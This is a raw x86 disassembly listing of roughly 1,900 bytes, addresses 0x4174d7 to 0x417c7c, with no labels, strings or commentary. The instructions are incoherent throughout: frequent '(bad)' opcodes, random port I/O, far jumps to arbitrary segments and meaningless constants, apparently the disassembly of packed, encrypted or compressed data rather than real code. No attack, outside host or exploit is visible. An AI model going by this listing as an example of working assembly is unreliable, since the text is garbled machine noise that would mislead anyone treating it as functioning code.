  4174d7:	nop
  4174d8:	fs mov ch,0x8d
  4174db:	dec    edx
  4174dc:	lds    esi,FWORD PTR [ecx]
  4174de:	mov    edx,0x1c5e6ca5
  4174e3:	jl     0x4174c2
  4174e5:	dec    ecx
  4174e6:	cwde   
  4174e7:	mov    bh,0x8a
  4174e9:	ret    
  4174ea:	jnp    0x417481
  4174ec:	push   ss
  4174ed:	mov    eax,ds:0x8ff2cbe3
  4174f2:	in     al,0x3
  4174f4:	add    DWORD PTR [ecx],ebx
  4174f6:	mov    edi,0x518f1ab0
  4174fb:	fwait
  4174fc:	jmp    0x9cafcdd3
  417501:	stos   DWORD PTR es:[edi],eax
  417502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417503:	dec    ecx
  417504:	(bad)  [eax]
  417506:	xchg   BYTE PTR [esi+0x6ecc5e6f],cl
  41750c:	mov    eax,ds:0xed322e5a
  417511:	pop    edx
  417512:	out    dx,al
  417513:	xor    eax,0xf850e5f1
  417518:	pop    ds
  417519:	mov    DWORD PTR [ecx],ecx
  41751b:	xor    BYTE PTR [eax],0x80
  41751e:	aad    0x26
  417520:	mov    DWORD PTR [ecx-0x2bb5bff4],ebp
  417526:	xor    edx,DWORD PTR [edi-0x3a9c2aaf]
  41752c:	push   edi
  41752d:	add    eax,ecx
  41752f:	push   esp
  417530:	and    eax,0xd10733b4
  417535:	adc    ebx,edi
  417537:	iret   
  417538:	cmp    eax,DWORD PTR [ebx+0x71]
  41753b:	shl    BYTE PTR [eax],0xbe
  41753e:	(bad)  
  41753f:	mov    esi,0xe2aa9791
  417544:	xchg   ecx,eax
  417545:	pop    ds
  417546:	bound  eax,QWORD PTR [edx+0x66]
  417549:	cwde   
  41754a:	xor    al,0xe4
  41754c:	dec    ecx
  41754d:	push   0xffffffaa
  41754f:	add    esi,DWORD PTR [ecx]
  417551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417552:	rcr    eax,cl
  417554:	gs retf 
  417556:	and    al,0xd4
  417558:	jmp    0xef897f44
  41755d:	test   eax,0x253a167f
  417562:	mul    DWORD PTR [esi-0x2793833a]
  417568:	scas   al,BYTE PTR es:[edi]
  417569:	fadd   st(2),st
  41756b:	jb     0x4175dc
  41756d:	lahf   
  41756e:	mov    cl,ch
  417570:	push   esp
  417571:	mov    bh,0x8b
  417573:	mov    eax,ds:0x7efa5484
  417578:	pop    esp
  417579:	mov    ch,0x97
  41757b:	sbb    DWORD PTR [esi+0x2b37112b],eax
  417581:	out    dx,eax
  417582:	popf   
  417583:	pop    ecx
  417584:	test   al,0x8b
  417586:	sub    ebp,eax
  417588:	jl     0x417591
  41758a:	dec    edx
  41758b:	jmp    0x337d:0x3cbc7717
  417592:	mov    ah,0xd9
  417594:	imul   cl
  417596:	sbb    DWORD PTR [esi+0xbed3917],0x28
  41759d:	mov    eax,0xa2c0a1d7
  4175a2:	cmp    eax,0xa542b397
  4175a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a8:	jnp    0x417586
  4175aa:	push   ecx
  4175ab:	push   cs
  4175ac:	stc    
  4175ad:	jbe    0x41754f
  4175af:	inc    edi
  4175b0:	js     0x41760f
  4175b2:	xor    edx,0x1d2a0205
  4175b8:	(bad)  
  4175b9:	fdivr  QWORD PTR [ecx]
  4175bb:	pop    es
  4175bc:	je     0x41755b
  4175be:	repnz sbb ah,BYTE PTR [eax-0x480155f3]
  4175c5:	imul   esi,DWORD PTR [eax+0x32c3762f],0xaf5f10f2
  4175cf:	(bad)  
  4175d1:	leave  
  4175d2:	dec    esp
  4175d3:	xor    cl,ch
  4175d5:	inc    esp
  4175d6:	push   edi
  4175d7:	jmp    0x1021821e
  4175dc:	daa    
  4175dd:	inc    esp
  4175de:	js     0x4175e9
  4175e0:	fild   DWORD PTR [esi-0x688fbc4]
  4175e6:	dec    ecx
  4175e7:	sbb    eax,edx
  4175e9:	xor    al,0x97
  4175eb:	pop    ebx
  4175ec:	xchg   edi,eax
  4175ed:	sahf   
  4175ee:	add    al,0x91
  4175f0:	cmp    al,0x1a
  4175f2:	fst    DWORD PTR [edi-0x6da0d86c]
  4175f8:	xchg   DWORD PTR [esi],ebx
  4175fa:	pop    esi
  4175fb:	push   ebx
  4175fc:	xchg   ecx,eax
  4175fd:	mov    al,ds:0x65c89273
  417602:	pop    esi
  417603:	mov    edi,0xf3b04e33
  417608:	cmp    DWORD PTR ss:[ecx+0x5bc8550e],esp
  41760f:	jmp    0x417597
  417611:	xor    edi,DWORD PTR [edx-0x5e]
  417614:	add    al,0xef
  417616:	jbe    0x417669
  417618:	inc    eax
  417619:	mov    edx,0x555b1b11
  41761e:	loope  0x4175a4
  417620:	jmp    0x8c0f30ef
  417625:	not    BYTE PTR [esi+edi*4-0x1b]
  417629:	out    dx,al
  41762a:	add    edi,DWORD PTR [ecx]
  41762c:	outs   dx,DWORD PTR ds:[esi]
  41762d:	imul   esp,esi,0xffffffc4
  417630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417631:	mov    bh,0x4b
  417633:	and    al,0xd4
  417635:	in     al,dx
  417636:	add    BYTE PTR [ecx],0x31
  417639:	or     dh,al
  41763b:	out    0x2f,eax
  41763d:	fisttp DWORD PTR [edi+0x5808048]
  417643:	in     al,0x59
  417645:	sub    ebp,ecx
  417647:	adc    BYTE PTR [ebx],0xf
  41764a:	push   esi
  41764b:	shl    bl,cl
  41764d:	sub    eax,0x29e414f9
  417652:	sub    BYTE PTR [ebx+eax*8-0x41],dl
  417656:	loopne 0x41763b
  417658:	push   ds
  417659:	ficomp DWORD PTR [edi-0x2a]
  41765c:	(bad)  
  41765d:	out    dx,al
  41765e:	ja     0x417635
  417660:	int    0x84
  417662:	lods   al,BYTE PTR ds:[esi]
  417663:	pxor   mm6,QWORD PTR [esi-0x5cfdc2cc]
  41766a:	jmp    0x41764d
  41766c:	repz push ecx
  41766e:	adc    al,bh
  417670:	inc    ebp
  417671:	add    esi,DWORD PTR [ebp-0x717ebd3]
  417677:	mov    BYTE PTR [esi+edx*8+0x42],dh
  41767b:	push   edi
  41767d:	not    bl
  41767f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417680:	repz sbb DWORD PTR [edx+edx*4],ecx
  417684:	sub    ecx,DWORD PTR [eax+0x41921535]
  41768a:	int    0x1a
  41768c:	dec    ecx
  41768d:	push   esp
  41768e:	test   eax,0xe42952dd
  417693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417694:	div    bl
  417696:	pop    ecx
  417697:	daa    
  417698:	popf   
  417699:	and    DWORD PTR [edi-0x27],ebp
  41769c:	pop    esp
  41769d:	sub    al,0xb5
  41769f:	addr16 test cl,bl
  4176a2:	sbb    edi,esp
  4176a4:	or     DWORD PTR [ecx+edx*8-0x3f],ebp
  4176a8:	mov    bl,0x63
  4176aa:	leave  
  4176ab:	aas    
  4176ac:	fidivr DWORD PTR [ecx]
  4176ae:	shl    DWORD PTR [edi],1
  4176b0:	in     eax,dx
  4176b1:	lods   al,BYTE PTR ds:[esi]
  4176b2:	xchg   edx,eax
  4176b3:	test   al,0x12
  4176b5:	cmp    eax,0x4a632dea
  4176ba:	clc    
  4176bb:	ss pop ecx
  4176bd:	push   ecx
  4176be:	jmp    0x5e7b:0xe89e799a
  4176c5:	cdq    
  4176c6:	add    al,0xb0
  4176c8:	or     al,0xf4
  4176ca:	xchg   esp,eax
  4176cb:	cmp    BYTE PTR [esi+0x2a],0xee
  4176cf:	mov    ch,al
  4176d1:	mov    edx,DWORD PTR [edx+0x3246c00c]
  4176d7:	mov    ds:0xd8e7ede7,al
  4176dc:	enter  0x9a96,0x93
  4176e0:	and    eax,0x1ddbe7b0
  4176e5:	xor    ebx,esp
  4176e7:	mov    cl,cl
  4176e9:	lds    edi,FWORD PTR [edx+0x12]
  4176ec:	(bad)  
  4176ed:	(bad)  
  4176ee:	mov    ah,0x5a
  4176f0:	ds retf 
  4176f2:	mov    al,ds:0xc1083336
  4176f7:	dec    ecx
  4176f8:	add    al,0xe3
  4176fa:	addr16 jbe 0x41769f
  4176fd:	xchg   ebp,eax
  4176fe:	xchg   dh,dl
  417700:	shl    BYTE PTR [edi+0x6e],cl
  417703:	xor    BYTE PTR [eax+0x57],al
  417706:	cmc    
  417707:	xor    ebp,DWORD PTR [eax]
  417709:	sub    al,0x88
  41770b:	push   ss
  41770c:	shl    BYTE PTR [ebx+0x1b79093e],cl
  417712:	sbb    ebp,ecx
  417714:	dec    esi
  417715:	xor    bh,BYTE PTR [eax]
  417717:	dec    edi
  417718:	out    0x7,eax
  41771a:	jno    0x417702
  41771c:	mov    ds:0xffb0c68d,eax
  417721:	xchg   esi,eax
  417722:	add    esi,esi
  417724:	mov    ebp,0x61464d60
  417729:	adc    eax,0xf20aea6c
  41772e:	dec    edi
  41772f:	ret    0x9c7e
  417732:	ret    0xdeda
  417735:	xor    edi,eax
  417737:	fld    DWORD PTR [eax+edx*4]
  41773a:	xchg   ebp,eax
  41773b:	xchg   ebx,eax
  41773c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41773d:	test   DWORD PTR [edx+0x12],edi
  417740:	not    bh
  417742:	jns    0x4176cf
  417744:	neg    DWORD PTR [edi-0x2c]
  417747:	dec    ebx
  417748:	dec    ebp
  417749:	xor    eax,0xe5f8de9b
  41774e:	test   BYTE PTR [ecx],ch
  417750:	xor    BYTE PTR [edi+eax*1+0x21bbefbf],0x37
  417758:	in     eax,0x88
  41775a:	clc    
  41775b:	imul   edx,DWORD PTR [edx-0x1f],0x6c424089
  417762:	sub    BYTE PTR [eax-0x45c1da2b],al
  417768:	mov    eax,DWORD PTR [ebx+eax*8+0x10398fc]
  41776f:	mov    eax,0x35724924
  417774:	inc    edi
  417775:	push   ebx
  417776:	xor    al,0xe1
  417778:	fistp  WORD PTR [ecx+0x62]
  41777b:	sti    
  41777c:	out    dx,eax
  41777d:	lock adc eax,0x8ec05f8a
  417783:	pop    ecx
  417784:	mov    BYTE PTR ds:0x2b7a782b,dl
  41778a:	sbb    al,0xff
  41778c:	jl     0x41775c
  41778e:	add    BYTE PTR [esi],cl
  417790:	das    
  417791:	push   edx
  417792:	out    0x7b,eax
  417794:	shl    BYTE PTR [eax],0x86
  417797:	mov    bl,0x59
  417799:	xchg   edx,eax
  41779a:	sbb    ah,BYTE PTR [ebx]
  41779c:	jge    0x4177b8
  41779e:	sbb    BYTE PTR [edx-0x3c],ch
  4177a1:	xchg   ecx,eax
  4177a2:	adc    ebx,DWORD PTR [eax+0x67bfd0af]
  4177a8:	out    0x20,eax
  4177aa:	jg     0x4177b2
  4177ac:	in     eax,dx
  4177ad:	pop    ds
  4177ae:	or     al,0x73
  4177b0:	pop    edx
  4177b1:	inc    esp
  4177b2:	aaa    
  4177b3:	sub    BYTE PTR [edx-0x7f679297],ah
  4177b9:	int3   
  4177ba:	push   ds
  4177bb:	mov    dl,0xe0
  4177bd:	inc    ebx
  4177be:	scas   al,BYTE PTR es:[edi]
  4177bf:	cdq    
  4177c0:	ret    0xca5f
  4177c3:	test   BYTE PTR [esi+ebx*1-0x8396bff],ch
  4177ca:	mov    edi,0xb41e1cbc
  4177cf:	ret    
  4177d0:	pop    ebp
  4177d1:	xor    al,0xa3
  4177d3:	lods   eax,DWORD PTR ds:[esi]
  4177d4:	es stos DWORD PTR es:[edi],eax
  4177d6:	push   ds
  4177d7:	leave  
  4177d8:	aad    0xf3
  4177da:	xchg   ah,bl
  4177dc:	add    DWORD PTR [esi+0x23bfdeb4],esp
  4177e2:	xchg   ebx,eax
  4177e3:	pop    esp
  4177e4:	icebp  
  4177e5:	xchg   ebx,eax
  4177e6:	cmp    ah,BYTE PTR [ecx+0x7d91f72f]
  4177ec:	sbb    bh,bl
  4177ee:	adc    DWORD PTR [esp+edi*1],edi
  4177f1:	mov    ds:0xd781fc70,al
  4177f6:	jmp    0x1078:0x5df3329a
  4177fd:	mov    ebx,0xe10900d
  417802:	xchg   edx,eax
  417803:	stc    
  417804:	xchg   BYTE PTR [esi+0x666d3bd4],al
  41780a:	push   ebp
  41780b:	ret    
  41780c:	mov    ecx,0xd223cbb4
  417811:	loop   0x4177d4
  417813:	fidivr WORD PTR [edi-0xbb1c789]
  417819:	(bad)  
  41781a:	iret   
  41781b:	jecxz  0x417817
  41781d:	inc    esi
  41781e:	out    dx,eax
  41781f:	mov    al,0xab
  417821:	outs   dx,BYTE PTR ds:[esi]
  417822:	ins    DWORD PTR es:[edi],dx
  417823:	call   0x49f7:0x3facda0f
  41782a:	sbb    BYTE PTR [edi-0x633a3ee7],al
  417830:	sbb    BYTE PTR fs:[edi-0x7a90f26c],dh
  417837:	(bad)  
  417838:	xor    BYTE PTR [eax+0x65e07bf7],dh
  41783e:	sub    al,0xb7
  417840:	jmp    0xb95860e3
  417845:	xchg   esp,eax
  417846:	in     al,dx
  417847:	(bad)
  41784a:	xchg   edi,eax
  41784b:	clc    
  41784c:	push   edx
  41784d:	jae    0x417898
  41784f:	adc    bh,BYTE PTR ds:0x3e97db2a
  417855:	scas   al,BYTE PTR es:[edi]
  417856:	xchg   edi,eax
  417857:	(bad)  
  417858:	mov    ah,0x32
  41785a:	lds    eax,FWORD PTR ds:0x83104964
  417860:	stc    
  417861:	(bad)  
  417862:	in     al,dx
  417863:	ret    
  417864:	pop    ebx
  417865:	pop    eax
  417866:	loopne 0x4178ad
  417868:	(bad)  
  417869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41786a:	aas    
  41786b:	sub    BYTE PTR [ebx],0xf5
  41786e:	neg    DWORD PTR [eax-0x15]
  417871:	cli    
  417872:	cld    
  417873:	aas    
  417874:	arpl   WORD PTR [eax-0x4],dx
  417877:	or     edi,DWORD PTR [edx+0x70db2255]
  41787d:	jno    0x4178c5
  41787f:	enter  0xb110,0xac
  417883:	push   ds
  417884:	sub    dl,bl
  417886:	bound  edi,QWORD PTR [edi-0x62]
  417889:	sbb    edi,DWORD PTR [edi]
  41788b:	xor    al,dl
  41788d:	into   
  41788e:	aad    0x82
  417890:	call   0x43627c3e
  417895:	leave  
  417896:	ja     0x417884
  417898:	or     al,0xa8
  41789a:	outs   dx,DWORD PTR ds:[esi]
  41789b:	xchg   ecx,eax
  41789c:	(bad)  
  41789d:	jmp    0xc8eb13d7
  4178a2:	jns    0x4178fe
  4178a4:	xchg   ecx,eax
  4178a5:	mov    dl,BYTE PTR [eax]
  4178a7:	add    eax,0x8840c199
  4178ac:	retf   
  4178ad:	dec    ebx
  4178ae:	sbb    dh,dl
  4178b0:	or     al,0xc5
  4178b2:	inc    eax
  4178b3:	dec    ebx
  4178b4:	mov    esi,0xe9cb0397
  4178b9:	pop    edx
  4178ba:	jecxz  0x41783f
  4178bc:	das    
  4178bd:	mov    DWORD PTR [eax*8-0x67ed2a84],esp
  4178c4:	lahf   
  4178c5:	jmp    0x4178f9
  4178c7:	sub    esp,eax
  4178c9:	inc    esi
  4178ca:	sbb    al,0x84
  4178cc:	dec    DWORD PTR [edi+ecx*8-0x54]
  4178d0:	jb     0x4178fe
  4178d2:	push   ecx
  4178d3:	jae    0x417894
  4178d5:	mov    ah,0x25
  4178d7:	fistp  DWORD PTR [edi*2+0x7e4d820]
  4178de:	idiv   DWORD PTR [ebp-0x1f]
  4178e1:	in     eax,dx
  4178e2:	(bad)  
  4178e3:	jae    0x4178e8
  4178e5:	sti    
  4178e6:	sbb    edx,DWORD PTR [eax+0x1f71328f]
  4178ec:	loope  0x4178c8
  4178ee:	addr16 inc ebp
  4178f0:	das    
  4178f1:	xchg   esi,eax
  4178f2:	lahf   
  4178f3:	jbe    0x4178d0
  4178f5:	es data16 in al,0x77
  4178f9:	adc    ebx,esp
  4178fb:	jge    0x417915
  4178fd:	cli    
  4178fe:	aaa    
  4178ff:	test   ebp,ecx
  417901:	add    al,0x70
  417903:	ds inc ebx
  417905:	icebp  
  417906:	add    DWORD PTR [eax-0x45],ebx
  417909:	adc    bh,al
  41790b:	rcl    BYTE PTR [ecx+0x4a],0x9d
  41790f:	push   eax
  417910:	xchg   ebp,eax
  417911:	and    eax,0x3a858ecc
  417916:	inc    edi
  417917:	mov    ebx,0x177b6737
  41791c:	sar    DWORD PTR [ebx+0x3d],0x67
  417920:	cmp    al,0x2d
  417922:	lea    ecx,[esi]
  417924:	mov    esp,ebx
  417926:	ds repnz out dx,al
  417929:	and    al,0x8f
  41792b:	and    al,0xc9
  41792d:	push   0xab989e97
  417932:	or     esp,DWORD PTR [ebx]
  417934:	add    bh,bl
  417936:	mov    ecx,0x8dcc90e3
  41793b:	ins    DWORD PTR es:[edi],dx
  41793c:	leave  
  41793d:	les    eax,FWORD PTR [edx+0x79]
  417940:	repnz sub al,0x79
  417943:	outs   dx,DWORD PTR ds:[esi]
  417944:	cmp    al,0x38
  417946:	xchg   ebp,eax
  417947:	loop   0x4179b6
  417949:	and    BYTE PTR [eax-0x28],dh
  41794c:	mov    esi,edi
  41794e:	mov    al,ds:0x708d8ce2
  417953:	hlt    
  417954:	test   al,0xce
  417956:	jns    0x41793c
  417958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417959:	xchg   esp,eax
  41795a:	xchg   ebp,eax
  41795b:	fwait
  41795c:	das    
  41795d:	and    al,BYTE PTR [esp+ecx*1-0x159f101c]
  417964:	mov    ah,0xa6
  417966:	adc    BYTE PTR [esi-0x4488567c],bh
  41796c:	popa   
  41796d:	adc    ebx,0xffffff92
  417970:	or     ebp,DWORD PTR [esi]
  417972:	imul   edx,eax,0xffffffc9
  417975:	inc    esp
  417976:	aad    0xe7
  417978:	ins    BYTE PTR es:[edi],dx
  417979:	cmp    eax,edx
  41797b:	dec    esp
  41797c:	push   edi
  41797d:	sbb    BYTE PTR [ebp-0x492edda6],dh
  417983:	sbb    DWORD PTR [esi-0x363b1a3c],eax
  417989:	jne    0x4179a0
  41798b:	add    cl,BYTE PTR [eax+0x16780e30]
  417991:	int    0xd1
  417993:	aam    0xb4
  417995:	popa   
  417996:	jnp    0x417949
  417998:	fadd   st(6),st
  41799a:	std    
  41799b:	adc    al,0x31
  41799d:	pop    ecx
  41799e:	dec    eax
  41799f:	add    bh,BYTE PTR [ecx-0x67]
  4179a2:	jns    0x417930
  4179a4:	pop    ds
  4179a5:	setl   dl
  4179a8:	ror    BYTE PTR [ecx+0x7dbed4d6],0xef
  4179af:	and    eax,0x6c43a9fe
  4179b4:	and    eax,0x27106686
  4179b9:	div    DWORD PTR [esi]
  4179bb:	jecxz  0x417974
  4179bd:	ja     0x4179ba
  4179bf:	xchg   ebx,eax
  4179c0:	mov    edi,0xad3b252d
  4179c5:	sub    bl,BYTE PTR [eax+0x67]
  4179c8:	push   es
  4179c9:	push   DWORD PTR [ecx-0x4bf43c38]
  4179cf:	add    eax,0x85a7c0a9
  4179d4:	pop    ebp
  4179d5:	jg     0x417964
  4179d7:	and    DWORD PTR [ebp-0x1e],edx
  4179da:	int3   
  4179db:	rcr    DWORD PTR [edx],1
  4179dd:	mov    bh,0x91
  4179df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e0:	sbb    BYTE PTR [edx+0x4],ah
  4179e3:	jae    0x41799d
  4179e5:	(bad)  
  4179e6:	xlat   BYTE PTR ds:[ebx]
  4179e7:	push   es
  4179e8:	push   ebp
  4179e9:	jns    0x417a67
  4179eb:	mov    ?,WORD PTR [ebp+0x6c]
  4179ee:	rol    ecx,cl
  4179f0:	popf   
  4179f1:	inc    edx
  4179f2:	xor    eax,0xde3e2889
  4179f7:	push   0xb3f86ad7
  4179fc:	mov    fs,WORD PTR [esi-0x26]
  4179ff:	pop    ebx
  417a00:	dec    esp
  417a01:	clc    
  417a02:	sub    eax,0x260e9946
  417a07:	or     esp,ebp
  417a09:	dec    esp
  417a0a:	mov    dh,0x71
  417a0c:	lea    esi,[ecx]
  417a0e:	test   DWORD PTR [esi-0x7391251b],ecx
  417a14:	ins    DWORD PTR es:[edi],dx
  417a15:	shl    BYTE PTR [ebp+0x3e],1
  417a18:	lock mov cl,0x1
  417a1b:	shl    BYTE PTR [ebx-0x5e],cl
  417a1e:	pop    esp
  417a1f:	mov    bl,0x25
  417a21:	pop    gs
  417a23:	jp     0x417a2b
  417a25:	jl     0x4179cb
  417a27:	les    esi,FWORD PTR [edi-0x5f061acf]
  417a2d:	inc    esp
  417a2e:	xchg   ecx,eax
  417a2f:	sbb    eax,0x354cfb1b
  417a34:	imul   eax,DWORD PTR [edi+0x28],0xffffffdd
  417a38:	ffree  st(1)
  417a3a:	pushf  
  417a3b:	mov    eax,ds:0x950578b1
  417a40:	sbb    eax,0x30dc7f80
  417a45:	mov    ah,0x7c
  417a47:	mov    ecx,0xf444adf1
  417a4c:	xor    eax,0x3ccd041e
  417a51:	dec    ecx
  417a52:	in     al,0x38
  417a54:	scas   eax,DWORD PTR es:[edi]
  417a55:	mov    esi,0xea95752a
  417a5a:	xor    edi,edx
  417a5c:	or     BYTE PTR [ebp+ebp*2-0x33cef1ba],dh
  417a63:	mov    eax,0xd460f5f5
  417a68:	pop    edi
  417a69:	ficom  WORD PTR [edx-0x44]
  417a6c:	and    dh,BYTE PTR [edi]
  417a6e:	sti    
  417a6f:	inc    ebx
  417a70:	jno    0x417a10
  417a72:	stos   BYTE PTR es:[edi],al
  417a73:	dec    ebp
  417a74:	and    cl,bh
  417a76:	xchg   edi,eax
  417a77:	retf   0xc3f0
  417a7a:	fidiv  DWORD PTR [edx+0x51]
  417a7d:	call   0x4630:0x11727ab9
  417a84:	and    al,0xeb
  417a86:	or     al,0xed
  417a88:	add    DWORD PTR [eax-0x1f],ecx
  417a8b:	fimul  WORD PTR [esi+0x57]
  417a8e:	jbe    0x417a28
  417a90:	nop
  417a91:	inc    ecx
  417a92:	xchg   edx,eax
  417a93:	arpl   WORD PTR [ebx+0x37],ax
  417a96:	cdq    
  417a97:	clc    
  417a98:	mov    ds:0xeb1274ca,eax
  417a9d:	dec    ebp
  417a9e:	cmp    al,0x82
  417aa0:	dec    ebp
  417aa1:	ds in  al,dx
  417aa3:	popa   
  417aa4:	sub    BYTE PTR [ecx+0x35],cl
  417aa7:	ja     0x417a51
  417aa9:	inc    edx
  417aaa:	add    DWORD PTR [ebx],0x20
  417aad:	sub    eax,0xab29df0b
  417ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ab3:	xchg   BYTE PTR [esi+0x57],bl
  417ab6:	(bad)  
  417ab7:	in     al,dx
  417ab8:	(bad)  
  417ab9:	into   
  417aba:	jge    0x417a97
  417abc:	aaa    
  417abd:	or     dh,BYTE PTR [ebp-0x134d594d]
  417ac3:	adc    ebp,DWORD PTR [esi+ecx*4+0x7a2a091e]
  417aca:	jnp    0x417ad5
  417acc:	lds    edx,FWORD PTR [edx]
  417ace:	push   eax
  417acf:	out    dx,al
  417ad0:	out    0xc8,eax
  417ad2:	fwait
  417ad3:	mov    ch,0xfc
  417ad5:	pop    esi
  417ad6:	mov    bh,0xc5
  417ad8:	sbb    edx,DWORD PTR [ecx-0x55ff60fe]
  417ade:	xchg   BYTE PTR [edx+0x5c],bl
  417ae1:	sbb    bl,bh
  417ae3:	mov    dh,0x52
  417ae5:	jmp    0xb3b7:0x7c485ec8
  417aec:	push   0xffffffff
  417aee:	inc    ebx
  417aef:	enter  0x9cad,0xae
  417af3:	int3   
  417af4:	out    dx,al
  417af5:	js     0x417aa2
  417af7:	xchg   edi,eax
  417af8:	cld    
  417af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417afa:	and    DWORD PTR [esi-0x3e],edi
  417afd:	(bad)  
  417aff:	inc    ebp
  417b00:	test   al,0x25
  417b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b03:	cdq    
  417b04:	pop    ss
  417b05:	std    
  417b06:	pop    edi
  417b07:	dec    edi
  417b08:	out    0x58,eax
  417b0a:	test   al,0x12
  417b0c:	add    al,0xe8
  417b0e:	push   cs
  417b0f:	jbe    0x417b7c
  417b11:	iret   
  417b12:	popa   
  417b13:	cmp    bh,BYTE PTR [eax+esi*8-0x3dc781e3]
  417b1a:	adc    ah,BYTE PTR [ecx-0x36]
  417b1d:	in     al,0xf6
  417b1f:	(bad)  
  417b20:	mov    cl,0xc3
  417b22:	test   BYTE PTR [edi+esi*1+0x79],ch
  417b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b28:	shl    ebx,cl
  417b2a:	mov    esi,0xf5ac362
  417b2f:	cmp    eax,0x4cd58bf1
  417b34:	pusha  
  417b35:	fadd   QWORD PTR [ecx+edi*4]
  417b38:	adc    DWORD PTR [eax+0x331a6107],esi
  417b3e:	mov    eax,ds:0xff1478cc
  417b43:	adc    al,0x6
  417b45:	icebp  
  417b46:	cmp    BYTE PTR [eax-0x1b],dh
  417b49:	dec    ebx
  417b4a:	mov    esi,0xa0c85b07
  417b4f:	pop    esi
  417b50:	add    BYTE PTR [edx],bl
  417b52:	adc    ch,BYTE PTR [esi]
  417b54:	dec    ebp
  417b55:	xchg   esp,eax
  417b56:	loop   0x417b78
  417b58:	adc    al,0x8d
  417b5a:	(bad)  
  417b5b:	pop    ss
  417b5c:	mov    ecx,0x45d430ab
  417b61:	shl    DWORD PTR [esi],1
  417b63:	outs   dx,DWORD PTR ds:[esi]
  417b64:	xor    edi,esp
  417b66:	ss adc eax,0xf3674e8b
  417b6c:	xchg   ecx,ebp
  417b6e:	ret    0xeea6
  417b71:	(bad)  
  417b73:	mov    DWORD PTR [ebx-0xb876708],edx
  417b79:	(bad)  
  417b7a:	jnp    0x417b9d
  417b7c:	pop    ebx
  417b7d:	push   0xffffffc3
  417b7f:	movaps xmm2,XMMWORD PTR [ebx-0x48]
  417b83:	or     DWORD PTR [ebp-0x5f83bda1],0xea217031
  417b8d:	cmp    ecx,DWORD PTR [esi+0x73]
  417b90:	pop    es
  417b91:	pop    esp
  417b92:	daa    
  417b93:	pop    edx
  417b94:	rol    BYTE PTR ds:0x10ced7b7,cl
  417b9a:	or     BYTE PTR [ebp+0x5c],ch
  417b9d:	jecxz  0x417b66
  417b9f:	xor    eax,DWORD PTR [edx-0x6f7c4f9]
  417ba5:	dec    edx
  417ba6:	popa   
  417ba7:	fwait
  417ba8:	arpl   WORD PTR gs:[edi-0x475b9ce3],dx
  417baf:	fisub  WORD PTR [edi+edi*4-0x2505e82d]
  417bb6:	inc    eax
  417bb7:	sti    
  417bb8:	data16 and al,0xb9
  417bbb:	xor    ecx,eax
  417bbd:	into   
  417bbe:	xor    al,0xd7
  417bc0:	stc    
  417bc1:	ret    
  417bc2:	push   ecx
  417bc3:	dec    eax
  417bc4:	mov    ds:0xb2d7ff5d,eax
  417bc9:	or     dh,0xb3
  417bcc:	push   ds
  417bcd:	aam    0xc2
  417bcf:	jp     0x417b60
  417bd1:	loope  0x417b75
  417bd3:	pop    ss
  417bd4:	rep ins DWORD PTR es:[edi],dx
  417bd6:	or     eax,0x4051d69e
  417bdb:	outs   dx,DWORD PTR ds:[esi]
  417bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bdd:	dec    esi
  417bde:	mov    eax,ds:0x59882eba
  417be3:	add    DWORD PTR [ecx+0x168365b2],ebx
  417be9:	mov    ch,0xe8
  417beb:	push   ds
  417bec:	lods   eax,DWORD PTR ds:[esi]
  417bed:	mov    dh,0x14
  417bef:	js     0x417c60
  417bf1:	test   eax,0x622d7dc8
  417bf6:	mov    WORD PTR [edx],ds
  417bf8:	xchg   ebx,eax
  417bf9:	mov    ebp,0x2e5ea181
  417bfe:	shr    BYTE PTR [edi+ebp*4],cl
  417c01:	mov    eax,ds:0x843444d7
  417c06:	cmp    BYTE PTR [ebx-0x2004fb0],ch
  417c0c:	jne    0x417c83
  417c0e:	xor    DWORD PTR [esi+0x4d],esi
  417c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c12:	ror    BYTE PTR [esi],cl
  417c14:	pop    esi
  417c15:	fiadd  WORD PTR [ecx+0x6a]
  417c18:	mov    ch,0x1a
  417c1a:	sub    DWORD PTR [ebx+0x6e],edi
  417c1d:	adc    DWORD PTR [ebp+0x295c7ee7],esp
  417c23:	xchg   ecx,eax
  417c24:	bswap  ebp
  417c26:	fstp   DWORD PTR [ebx]
  417c28:	or     al,BYTE PTR [edx-0x6d39af3f]
  417c2e:	push   ds
  417c2f:	push   0xffffffd6
  417c31:	mov    al,0x7
  417c33:	es pop gs
  417c36:	and    ebp,esp
  417c38:	lock fadd DWORD PTR [ebx-0x5bfd91fc]
  417c3f:	mov    BYTE PTR [edi],al
  417c41:	enter  0xfca8,0x81
  417c45:	in     eax,dx
  417c46:	sub    BYTE PTR [ebx+eiz*8-0x46],ch
  417c4a:	jae    0x417cc4
  417c4c:	in     al,0xb8
  417c4e:	dec    esi
  417c4f:	outs   dx,BYTE PTR ds:[esi]
  417c50:	mov    eax,0x4060dcb9
  417c55:	adc    edx,DWORD PTR [eax+0x7130cf2]
  417c5b:	(bad)  
  417c5c:	mov    esp,ecx
  417c5e:	(bad)  
  417c5f:	fld    TBYTE PTR [ebx-0x29]
  417c62:	push   cs
  417c63:	mov    esi,0xd72e153b
  417c68:	inc    esi
  417c69:	jo     0x417c29
  417c6b:	pop    esi
  417c6c:	add    al,0xfa
  417c6e:	xchg   esi,eax
  417c6f:	pop    ebp
  417c70:	xor    al,0xf3
  417c72:	data16 shl BYTE PTR ds:0xc205475c,cl
  417c79:	push   es
  417c7a:	xchg   ebx,eax
  417c7b:	pop    es
  417c7c:	fdiv   QWORD PTR [ebx+0x21a0c7a3]
